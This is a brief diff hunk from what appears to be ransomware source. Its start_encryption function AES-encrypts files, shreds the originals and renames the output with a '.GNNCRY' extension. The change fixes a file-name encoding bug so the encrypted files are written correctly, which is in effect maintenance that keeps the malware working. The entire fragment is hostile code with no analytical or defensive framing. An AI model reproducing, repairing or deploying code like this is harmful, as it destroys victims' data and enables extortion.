@@ -82,7 +82,7 @@ def start_encryption(files):
         encrypted = AES_obj.encrypt(file_content)
         shred(found_file)
 
-        new_file_name = found_file + ".GNNCRY"
+        new_file_name = found_file.decode('utf-8') + ".GNNCRY"
         with open(new_file_name, 'wb') as f:
             f.write(encrypted)
 
